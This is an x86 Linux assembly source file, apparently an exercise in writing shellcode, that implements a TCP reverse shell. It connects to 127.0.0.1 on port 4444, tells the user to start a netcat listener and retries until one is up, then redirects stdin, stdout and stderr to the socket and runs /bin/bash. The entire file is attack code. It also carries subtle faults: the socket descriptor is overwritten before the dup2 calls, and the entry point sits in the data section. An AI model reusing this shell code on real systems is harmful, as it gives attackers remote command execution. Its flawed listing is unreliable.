; last update by KD and SD the 15/01/22

global _start


section .text


section .data
ncmsg db "You need to launch nc -nlvp 4444", 0xA
len equ $ - ncmsg

timeval:
tv_sec dd 0 ; seconds
tv_nsec dd 0 ; nanoseconds


_start:
; clean registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

mov al, 0x66 ; socketcall syscall
mov bl, 0x1  ; socket syscall

push ecx ; protocol : tcp
push 0x1 ; socket type : SOCKET_STREAM
push 0x2 ; domain : PF_INET

mov  ecx, esp

int 0x80 ; launch the syscall

xor ecx, ecx

mov edx, eax ; mov socketfd from socket syscall return value in edx
mov al, 0x66 ; socketcall syscall
mov bl, 0x3  ; connect syscall

; sockaddr structure
push 0x0100007F ; address
push word 0x5C11 ; port
push word 0x2 ; type

mov esi, esp ; save address of the sockaddr

push 0x10 ; addrlen
push esi  ; address of sockaddr
push edx  ; socketfd

mov ecx, esp ; ecx point to the top of the stack

int 0x80

; if the return code of eax is not null, nc is not lauch, so we need to wait and go back to the begining of the code

cmp eax, 0
je dupfd

mov edx, len
mov ecx, ncmsg
mov ebx, 1
mov eax, 4
int 0x80

mov dword [tv_sec], 0xA
mov dword [tv_nsec], 0
mov eax, 0xA2
mov ebx, timeval
mov ecx, 0
int 0x80

jmp _start

dupfd:
mov al, 0x3F ; mov dup2 syscall to al for STDIN
mov ebx, edx ; mov socketfd in ebx

xor ecx, ecx
xor ebx, ebx

int 0x80

mov al,0x3F ; mov dup2 syscall to al for STDOUT
mov cl, 0x1

int 0x80

mov al, 0x3F ; mov dup2 syscall to al for STDERR
mov cl, 0x2

int 0x80

mov al, 0xB ; execve syscall

push ebx        ; NULL
push 0x68736162 ; hsab
push 0x2F2F2F2F ; ////
push 0x6E69622F ; nib/

mov ebx, esp

xor ecx, ecx
xor edx, edx

int 0x80
